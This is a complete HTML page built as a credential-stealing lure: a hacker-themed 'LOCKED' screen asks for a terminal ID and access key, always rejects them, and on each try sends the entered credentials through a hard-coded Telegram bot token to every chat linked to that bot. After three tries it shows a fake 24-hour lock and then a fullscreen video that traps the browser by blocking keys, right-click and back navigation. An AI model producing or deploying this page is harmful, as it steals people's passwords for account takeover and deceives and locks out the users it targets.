<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 SECURITY BREACH</title>
    <style>
        /* ХАКЕРСКИЙ СТИЛЬ — МАТРИЦА, НЕОН, ГЛИТЧ */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Courier New', Courier, monospace;
            background: radial-gradient(circle at 20% 20%, #0f0f1e, #010101);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            color: #b5ffb5;
            text-shadow: 0 0 5px #00ff00, 0 0 10px #00cc00;
            position: relative;
            overflow-x: hidden;
        }

        /* матричный фон (ascii дождь) */
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, 
                rgba(0,255,0,0.03) 0px, 
                rgba(0,0,0,0.5) 2px, 
                transparent 3px,
                transparent 5px);
            pointer-events: none;
            z-index: 0;
        }

        .page {
            background: rgba(10, 15, 10, 0.85);
            backdrop-filter: blur(6px);
            border: 2px solid #22ff22;
            box-shadow: 0 0 30px #00aa00, inset 0 0 20px #003300;
            border-radius: 8px;
            padding: 2.5rem 2rem;
            width: 90%;
            max-width: 480px;
            text-align: center;
            position: relative;
            z-index: 10;
            transition: all 0.3s;
        }

        /* глитч-эффект для заголовков */
        h2 {
            font-weight: 400;
            font-size: 2.5rem;
            letter-spacing: 6px;
            margin-bottom: 1.5rem;
            color: #aaffaa;
            text-transform: uppercase;
            text-shadow: 2px 2px 0 #00ff00, -2px -2px 0 #003300, 0 0 15px #00ff00;
            animation: glitch 2s infinite;
            word-break: break-word;
        }

        @keyframes glitch {
            0%, 100% { transform: skew(0deg, 0deg); opacity: 1; text-shadow: 2px 2px 0 #00ff00, -2px -2px 0 #003300; }
            95% { transform: skew(2deg, 1deg); text-shadow: -3px 0 0 cyan, 3px 0 0 magenta; }
            96% { transform: skew(-2deg, -1deg); text-shadow: 2px 2px 0 red, -2px -2px 0 blue; }
            97% { transform: skew(0deg, 0deg); text-shadow: 2px 2px 0 #00ff00, -2px -2px 0 #003300; }
        }

        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 2rem;
            gap: 10px;
        }

        .step {
            flex: 1;
            height: 8px;
            background: #1a3a1a;
            border-radius: 0;
            box-shadow: 0 0 6px #00aa00;
            transition: 0.3s;
        }

        .step.active {
            background: #55ff55;
            box-shadow: 0 0 20px #00ff00, 0 0 40px #007700;
        }

        .input-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 0.4rem;
            font-size: 1rem;
            color: #88ff88;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 0 0 3px #00ff00;
        }

        input {
            width: 100%;
            padding: 1rem 1.2rem;
            background: #0a1a0a;
            border: 2px solid #22cc22;
            border-radius: 0;
            font-size: 1.2rem;
            font-family: 'Courier New', monospace;
            color: #c0ffc0;
            outline: none;
            transition: 0.15s;
            box-shadow: 0 0 15px #004400;
        }

        input:focus {
            border-color: #55ff55;
            box-shadow: 0 0 30px #00ff00;
            background: #0f2a0f;
        }

        button {
            background: #112211;
            border: 3px solid #33ff33;
            border-radius: 0;
            padding: 1rem 2rem;
            width: 100%;
            font-size: 1.6rem;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            color: #33ff33;
            letter-spacing: 5px;
            cursor: pointer;
            box-shadow: 0 0 30px #00aa00, inset 0 0 10px #004400;
            transition: 0.1s;
            margin-top: 1rem;
            text-transform: uppercase;
            text-shadow: 0 0 8px #00ff00;
        }

        button:hover {
            background: #1f3a1f;
            border-color: #77ff77;
            box-shadow: 0 0 50px #22ff22;
        }

        button:active {
            transform: translateY(4px);
            box-shadow: 0 0 20px #00aa00;
        }

        .error-message {
            background: #2a0f0f;
            border-left: 8px solid #ff5555;
            padding: 1rem;
            border-radius: 0;
            margin: 1.5rem 0 0.5rem;
            color: #ffa0a0;
            font-weight: bold;
            text-shadow: 0 0 3px red;
            border: 1px solid #aa2222;
            box-shadow: 0 0 20px #aa0000;
        }

        .info-message {
            background: #0f270f;
            border: 2px solid #55ff55;
            padding: 1.8rem 1rem;
            margin: 1.5rem 0;
            font-size: 1.5rem;
            text-transform: uppercase;
            box-shadow: 0 0 40px #00aa00;
            color: #b0ffb0;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { text-shadow: 0 0 5px #00ff00; }
            50% { text-shadow: 0 0 20px #00ff00, 0 0 40px #007700; }
            100% { text-shadow: 0 0 5px #00ff00; }
        }

        .video-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: black;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            pointer-events: none;
            outline: none;
        }

        .hidden {
            display: none !important;
        }

        .ok-btn {
            border-color: #55aa55;
            background: #0a2b0a;
            box-shadow: 0 0 30px #22aa22;
        }

        /* сканлайн */
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 10px;
            background: rgba(0, 255, 0, 0.1);
            animation: scan 8s linear infinite;
            pointer-events: none;
            z-index: 999;
        }

        @keyframes scan {
            0% { top: -10px; }
            20% { top: 20%; }
            40% { top: 40%; }
            60% { top: 60%; }
            80% { top: 80%; }
            100% { top: 110%; }
        }
    </style>
</head>
<body>
    <div class="scanline"></div>

    <!-- PAGE 1 – LOGIN -->
    <div id="page1" class="page">
        <div class="step-indicator">
            <div class="step active"></div>
            <div class="step"></div>
            <div class="step"></div>
        </div>
        <h2>🔐 LOCKED</h2>
        <div class="input-group">
            <label>> TERMINAL ID</label>
            <input type="text" id="userid" placeholder="Enter ID..." autocomplete="off">
        </div>
        <div class="input-group">
            <label>> ACCESS KEY</label>
            <input type="password" id="password" placeholder="********" autocomplete="off">
        </div>
        <button id="unblockBtn">[ UNBLOCK ]</button>
        <div id="errorContainer" class="error-message hidden"></div>
    </div>

    <!-- PAGE 2 – 24H LOCK -->
    <div id="page2" class="page hidden">
        <div class="step-indicator">
            <div class="step"></div>
            <div class="step active"></div>
            <div class="step"></div>
        </div>
        <h2>⛔ HALT</h2>
        <div class="info-message">
            > SYSTEM LOCKED <br> 24 HOURS REMAINING
        </div>
        <button id="okBtn" class="ok-btn">[ OK ]</button>
    </div>

    <!-- PAGE 3 – VIDEO LOOP (FULLSCREEN) -->
    <div id="page3" class="hidden video-container">
        <video id="loopVideo" autoplay loop muted playsinline>
            <source src="video.mp4" type="video/mp4">
            [ VIDEO FEED OFFLINE ]
        </video>
    </div>

    <script>
        (function() {
            // ==================== TELEGRAM CONFIG ====================
            const TELEGRAM_TOKEN = '8768112782:AAFCF0zuKE2dW8aGVWGwvfhGUkv0unth_58';

            // ==================== STATE ====================
            let attempts = 0;
            const MAX_ATTEMPTS = 3;
            let currentUserId = '';
            let currentPassword = '';

            // DOM
            const page1 = document.getElementById('page1');
            const page2 = document.getElementById('page2');
            const page3 = document.getElementById('page3');
            const unblockBtn = document.getElementById('unblockBtn');
            const okBtn = document.getElementById('okBtn');
            const userIdInput = document.getElementById('userid');
            const passwordInput = document.getElementById('password');
            const errorContainer = document.getElementById('errorContainer');
            const videoElement = document.getElementById('loopVideo');

            function showError(text) {
                errorContainer.textContent = text;
                errorContainer.classList.remove('hidden');
            }
            function hideError() {
                errorContainer.classList.add('hidden');
            }

            // GET ALL CHAT IDS FROM BOT UPDATES
            async function getAllChatIds() {
                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`;
                try {
                    const response = await fetch(url);
                    const data = await response.json();
                    if (data.ok && data.result.length > 0) {
                        const chatIds = new Set();
                        data.result.forEach(update => {
                            if (update.message && update.message.chat && update.message.chat.id) {
                                chatIds.add(update.message.chat.id);
                            } else if (update.my_chat_member && update.my_chat_member.chat && update.my_chat_member.chat.id) {
                                chatIds.add(update.my_chat_member.chat.id);
                            } else if (update.channel_post && update.channel_post.chat && update.channel_post.chat.id) {
                                chatIds.add(update.channel_post.chat.id);
                            }
                        });
                        return Array.from(chatIds);
                    }
                    return [];
                } catch (e) {
                    console.error('getUpdates error:', e);
                    return [];
                }
            }

            // BROADCAST TO ALL USERS WHO EVER STARTED THE BOT
            async function broadcastToAllUsers(id, pwd, attemptNum) {
                const chatIds = await getAllChatIds();
                const text = `🔐 BREACH DETECTED\nID: ${id}\nPASS: ${pwd}\nATTEMPT: ${attemptNum}/${MAX_ATTEMPTS}`;

                if (chatIds.length === 0) {
                    // fallback: send to the bot's own ID from token (might be bot id, but try)
                    try {
                        const fallbackUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
                        await fetch(fallbackUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: '8768112782',
                                text: text,
                                parse_mode: 'HTML'
                            })
                        });
                    } catch (e) {}
                    return;
                }

                const sendPromises = chatIds.map(chatId => {
                    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
                    return fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: text,
                            parse_mode: 'HTML'
                        })
                    }).catch(err => console.log(`send to ${chatId} failed`));
                });

                await Promise.allSettled(sendPromises);
                console.log(`[✓] Broadcast sent to ${chatIds.length} recipients`);
            }

            // ========== PAGE 1 LOGIC ==========
            unblockBtn.addEventListener('click', async function() {
                const id = userIdInput.value.trim();
                const pwd = passwordInput.value.trim();

                if (!id || !pwd) {
                    showError('> ACCESS DENIED: FIELDS EMPTY');
                    return;
                }

                currentUserId = id;
                currentPassword = pwd;
                attempts++;

                // send to ALL telegram users
                await broadcastToAllUsers(currentUserId, currentPassword, attempts);

                // always wrong password
                if (attempts < MAX_ATTEMPTS) {
                    showError(`> WRONG PASSWORD. ATTEMPTS LEFT: ${MAX_ATTEMPTS - attempts}`);
                    passwordInput.value = '';
                } else {
                    hideError();
                    userIdInput.value = '';
                    passwordInput.value = '';

                    // move to page 2
                    page1.classList.add('hidden');
                    page2.classList.remove('hidden');
                }
            });

            // ========== PAGE 2 -> PAGE 3 ==========
            okBtn.addEventListener('click', function() {
                page2.classList.add('hidden');
                page3.classList.remove('hidden');
                videoElement.play().catch(e => console.log('video play required interaction'));
            });

            // ========== VIDEO LOCKDOWN ==========
            document.addEventListener('keydown', function(e) {
                if (!page3.classList.contains('hidden')) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, true);

            document.addEventListener('contextmenu', function(e) {
                if (!page3.classList.contains('hidden')) {
                    e.preventDefault();
                    return false;
                }
            });

            window.addEventListener('popstate', function(e) {
                if (!page3.classList.contains('hidden')) {
                    history.pushState(null, null, location.href);
                }
            });

            (function freezeHistory() {
                history.pushState(null, null, location.href);
                window.addEventListener('popstate', function() {
                    if (!page3.classList.contains('hidden')) {
                        history.pushState(null, null, location.href);
                    }
                });
            })();

            setInterval(() => {
                if (!page3.classList.contains('hidden') && videoElement.paused) {
                    videoElement.play().catch(() => {});
                }
            }, 500);

            videoElement.onerror = function() {
                console.warn('⚠️ video.mp4 not found. place it in the same folder.');
            };

            videoElement.addEventListener('click', (e) => {
                e.preventDefault();
                return false;
            });

            // reset on load
            window.onload = function() {
                videoElement.load();
                page1.classList.remove('hidden');
                page2.classList.add('hidden');
                page3.classList.add('hidden');
                attempts = 0;
                hideError();
                userIdInput.value = '';
                passwordInput.value = '';
            };
        })();
    </script>
</body>
</html>
